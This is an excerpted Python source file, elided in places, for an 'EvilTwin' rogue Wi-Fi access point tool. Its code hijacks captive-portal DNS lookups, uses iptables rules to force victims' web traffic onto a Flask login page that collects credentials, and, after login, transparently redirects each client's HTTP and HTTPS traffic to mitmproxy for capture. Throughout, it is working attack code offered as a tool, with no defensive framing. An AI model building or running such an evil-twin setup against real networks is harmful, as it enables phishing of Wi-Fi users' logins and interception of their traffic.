...
class EvilTwin:
    ...
    Parameters mirror wpf_complete.EvilTwin:
        ...
        captive      – True (default) = with portal, internet blocked until login
                       and all HTTP redirected to portal; False = open AP, no
                       portal/redirect, direct internet.
    """
...
'''
    ...
    def __init__(self, iface_ap: str, ssid: str, channel: int = 6,
        ...
        # Mode selection: True = with captive portal (auth-gated internet),
        # False = open AP without portal (direct internet, no redirect/login).
        # Accepts bool/int/str ("1"/"2"/"yes"/"no"/"true"/"false"/"open"/"captive").
        if isinstance(captive, str):
            self.captive = captive.strip().lower() not in ("0", "false", "no", "n", "open", "2", "without", "none")
        else:
            self.captive = bool(captive)
        self._creds       = []
        self._procs       = []
    ...
    def _write_dnsmasq(self):
        ...
        # MODE: captive=True keeps the 5 hijacked captive domains (forces portal
        # popup). captive=False (open AP) omits hijacks so clients get real DNS
        # and direct internet with no redirect.
        conf = (f"interface={self.iface_ap}\n"
        ...
        if getattr(self, "captive", True):
            conf += (f"address=/captive.apple.com/{self.GW_IP}\n"
    ...
    def _forward_block_rule(self):
        """Return the FORWARD block rule for unauthenticated clients (captive mode)."""
        return ["-i", self.iface_ap, "-o", self.uplink_iface, "-j", "REJECT"]

    def _forward_block_rule_drop(self):
        """Fallback DROP variant if REJECT target is unavailable."""
        return ["-i", self.iface_ap, "-o", self.uplink_iface, "-j", "DROP"]

    def _forward_block_active(self) -> bool:
        """True if a FORWARD block (REJECT or DROP) for ap->uplink is present."""
        return (self._iptables_rule_exists("filter", "FORWARD", *self._forward_block_rule())
                or self._iptables_rule_exists("filter", "FORWARD", *self._forward_block_rule_drop()))

    def _ensure_forward_block(self):
        """Ensure unauthenticated FORWARD stays blocked (captive mode). Tries REJECT, falls back to DROP."""
        if self._forward_block_active():
            return
        r = subprocess.run(["iptables", "-A", "FORWARD"] + self._forward_block_rule(), capture_output=True)
        if r.returncode != 0:
            subprocess.run(["iptables", "-A", "FORWARD"] + self._forward_block_rule_drop(), capture_output=True)

    def _authorize_client_iptables(self, ip: str):
        """
        Grant internet to one authenticated client (captive mode only).
        - FORWARD ACCEPT for that IP (all protocols, inserted at top so it
          precedes the unauthenticated REJECT/DROP at the bottom).
        - Per-IP mitm REDIRECTs for 80/443 (!-d GW) inserted at top of nat
          PREROUTING so this IP's traffic goes to mitmproxy (capture) instead
          of the catch-all portal redirect at the bottom.
        Idempotent: skips rules that already exist.
        """
        if not getattr(self, "captive", True):
            return
        if not ip or ip == "unknown":
            return
        ap, gw, ul = self.iface_ap, self.GW_IP, self.uplink_iface
        mport = str(self.MITM_PORT)
        fwd = ["-s", ip, "-i", ap, "-o", ul, "-j", "ACCEPT"]
        if not self._iptables_rule_exists("filter", "FORWARD", *fwd):
            subprocess.run(["iptables", "-I", "FORWARD", "1"] + fwd, capture_output=True)
        for rule in (["-s", ip, "-i", ap, "-p", "tcp", "--dport", "80", "!", "-d", gw, "-j", "REDIRECT", "--to-port", mport],
                     ["-s", ip, "-i", ap, "-p", "tcp", "--dport", "443", "!", "-d", gw, "-j", "REDIRECT", "--to-port", mport]):
            if not self._iptables_rule_exists("nat", "PREROUTING", *rule):
                # Insert after any earlier per-IP ACCEPTs but before the
                # catch-all portal redirect: -I without position = position 1.
                # To keep 80 before 443 deterministically, append order via -I 1 twice in reverse.
                subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1"] + rule, capture_output=True)
        # MASQUERADE must still be present for this IP's NAT.
        if not self._iptables_rule_exists("nat", "POSTROUTING", "-s", "10.0.0.0/24", "-o", ul, "-j", "MASQUERADE"):
            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-s", "10.0.0.0/24", "-o", ul, "-j", "MASQUERADE"], capture_output=True)
    ...
    def _setup_iptables(self):
        ...
        MODES:
        - captive=True (with portal): no internet until login. ALL port-80 from
          the AP interface is REDIRECTed to the Flask portal, FORWARD ap->uplink
          ends with REJECT (DROP fallback) so normal browsing/HTTPS gets no
          internet, and any HTTP attempt lands back on the portal. Each login
          adds per-IP FORWARD ACCEPT + per-IP mitm REDIRECTs (see
          _authorize_client_iptables) so only authenticated IPs reach the net.
        - captive=False (open, no portal): direct internet, no login/redirect.
          Only mitm REDIRECTs (80/443 !-d GW → 8080) + blanket FORWARD ACCEPT.
        """
        gw, ap, ul    = self.GW_IP, self.iface_ap, self.uplink_iface
        mport, fport  = str(self.MITM_PORT), str(self.FLASK_PORT)
        captive = getattr(self, "captive", True)
        ...
        if captive:
            # Outbound from clients: allow ESTABLISHED return path; new
            # connections are per-IP ACCEPTed on login (top) with a final
            # REJECT for still-unauthenticated clients (bottom).
            subprocess.run(["iptables","-I","FORWARD","2","-i",ap,"-o",ul, "-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"], capture_output=True)
            # Re-add previously authenticated IPs (e.g. re-setup after flush).
            try:
                with self._auth_lock:
                    authed = sorted(self._authenticated_ips)
            except Exception:
                authed = []
            for ip in authed:
                try:
                    self._authorize_client_iptables(ip)
                except Exception:
                    pass
            # Captive PREROUTING: EVERYTHING on port 80 goes to the portal so
            # normal browsing without login lands back on the login page.
            subprocess.run(["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp","--dport","80","-j","REDIRECT","--to-port",fport], capture_output=True)
            # NOTE: no 443 REDIRECT pre-auth — HTTPS stays blocked by the
            # FORWARD REJECT below (can't portal-redirect TLS without cert
            # errors; blocking forces the user through HTTP/portal instead).
            # Per-IP mitm REDIRECTs for already-authed IPs sit ABOVE this
            # catch-all (inserted with -I), so authed HTTP/S bypasses portal.
            self._ensure_forward_block()
        else:
            # Open mode: blanket forward + mitm capture, no portal redirect.
            for cmd in [
                ["iptables","-I","FORWARD","2","-i",ap,"-o",ul,"-j","ACCEPT"],
                # Transparent proxy redirects — as in wpf_complete.py (no portal rule)
    ...
    def _keepalive_loop(self):
        ...
        while not self._keepalive_stop.is_set():
            ...
            # Mode-aware: captive mode must keep the portal catch-all + FORWARD
            # block (NOT the blanket ACCEPT / mitm catch-all); open mode keeps
            # the original blanket ACCEPT + mitm catch-alls.
            captive = getattr(self, "captive", True)
            if captive:
                checks = [
                    (["-t", "nat", "-C", "POSTROUTING", "-s", "10.0.0.0/24", "-o", ul, "-j", "MASQUERADE"], ["-t","nat","-A","POSTROUTING","-s","10.0.0.0/24","-o",ul,"-j","MASQUERADE"]),
                    (["-t", "nat", "-C", "PREROUTING", "-i", ap, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", fport], ["-t","nat","-A","PREROUTING","-i",ap,"-p","tcp","--dport","80","-j","REDIRECT","--to-port",fport]),
                ]
            else:
                checks = [
                    (["-t", "nat", "-C", "POSTROUTING", "-s", "10.0.0.0/24", "-o", ul, "-j", "MASQUERADE"], ["-t","nat","-A","POSTROUTING","-s","10.0.0.0/24","-o",ul,"-j","MASQUERADE"]),
            ...
            if captive:
                # Keep the unauthenticated FORWARD block in place.
                try:
                    self._ensure_forward_block()
                except Exception:
                    pass
                # Re-assert per-IP grants for already-authenticated clients so a
                # firewall flush never revokes internet from logged-in users.
                try:
                    with self._auth_lock:
                        authed = sorted(self._authenticated_ips)
                except Exception:
                ...
                for _ip in authed:
                    try:
                        self._authorize_client_iptables(_ip)
                    except Exception:
                        pass
                    ...
                    if ret is not None:
                        ...
                        if "dnsmasq" in str(args):
                            ...
                            if self._keepalive_mitm_retries >= 2:
                                ...
                                # Captive mode: only per-IP mitm REDIRECTs exist — remove
                                # those so authed clients fall through to direct NAT
                                # (unauth clients stay on portal + blocked).
                                if getattr(self, "captive", True):
                                    try:
                                        with self._auth_lock:
                                            _authed = sorted(self._authenticated_ips)
                                    except Exception:
                                        _authed = []
                                    for _ip in _authed:
                                        for tbl, chain, rule in [("nat","PREROUTING",["-s",_ip,"-i",self.iface_ap,"-p","tcp","--dport","80","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)]),
                                                                 ("nat","PREROUTING",["-s",_ip,"-i",self.iface_ap,"-p","tcp","--dport","443","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)])]:
                            ...
                            try:
                                ...
                                # Captive mode: re-add per-IP REDIRECTs for authed
                                # clients only (never a global catch-all — that
                                # would give unauth clients internet via mitm).
                                if getattr(self, "captive", True):
                                    try:
                                        with self._auth_lock:
                                            _authed2 = sorted(self._authenticated_ips)
                                    except Exception:
                                        _authed2 = []
                                    for _ip in _authed2:
                                        try:
    ...
    def _start_ap(self):
        ...
        if getattr(self, "captive", True):
            ...
            UI.ok(f"Evil Twin '{UI.YELLOW}{self.ssid}{UI.RESET}' ch{self.channel} | "
                  f"GW:{UI.CYAN}{self.GW_IP}{UI.RESET} | mode:{UI.GREEN}open (no portal){UI.RESET} | via:{UI.CYAN}{self.uplink_iface}{UI.RESET}")
    ...
    def _start_mitmproxy(self):
        ...
        try:
            ...
            if mp.poll() is not None:
                ...
                if getattr(self, "captive", True):
                    # Captive mode has no global mitm REDIRECT (only portal
                    # catch-all + per-IP mitm rules) — nothing to remove.
                    # Authed clients keep FORWARD ACCEPT so direct NAT works.
                    UI.warn("mitmproxy unavailable — authenticated clients use direct NAT (unauthenticated stay on portal/blocked)")
                else:
    ...
    def _flask_portal(self):
        ...
        def login():
            ...
            # Open the firewall for this IP ONLY (captive mode): unauthenticated
            # clients stay blocked + portal-redirected. This grants internet to
            # the logged-in IP via per-IP FORWARD ACCEPT + per-IP mitm
            # REDIRECTs (capture), or direct NAT if mitmproxy is dead.
            try:
                outer._authorize_client_iptables(ip)
            except Exception as e:
                UI.warn(f"Could not open firewall for {ip}: {e}")
            ...
            try:
                ...
                if mitm_alive:
                    ...
                    # Ensure direct NAT internet for THIS IP only: remove its
                    # per-IP mitm REDIRECTs (keep portal catch-all + FORWARD
                    # block for still-unauthenticated clients), keep MASQUERADE.
                    for tbl, chain, rule in [("nat","PREROUTING",["-s",ip,"-i",outer.iface_ap,"-p","tcp","--dport","80","!","-d",outer.GW_IP,"-j","REDIRECT","--to-port",str(outer.MITM_PORT)]),
                                             ("nat","PREROUTING",["-s",ip,"-i",outer.iface_ap,"-p","tcp","--dport","443","!","-d",outer.GW_IP,"-j","REDIRECT","--to-port",str(outer.MITM_PORT)])]:
                        subprocess.run(["iptables","-t",tbl,"-D",chain] + rule, capture_output=True)
    ...
    def run(self):
        if getattr(self, "captive", True):
            ...
            UI.section("Rogue AP — Evil Twin (Open, No Portal)")
        if getattr(self, "captive", True) and not FLASK_OK:
        ...
        if getattr(self, "captive", True):
            ...
            UI.info("Mode     : WITH captive portal — internet blocked until login; HTTP redirected to portal")
        else:
            UI.info("Mode     : WITHOUT captive portal (open) — direct internet, no login/redirect")
        if self.bssid:
        ...
        if getattr(self, "captive", True):
            ...
            UI.ok("Walled garden: unauthenticated clients get portal on any HTTP + no internet; login opens internet for that IP only")
        else:
            UI.ok("Open AP live — no portal, no redirect; clients get direct internet (mitm capture still active)")
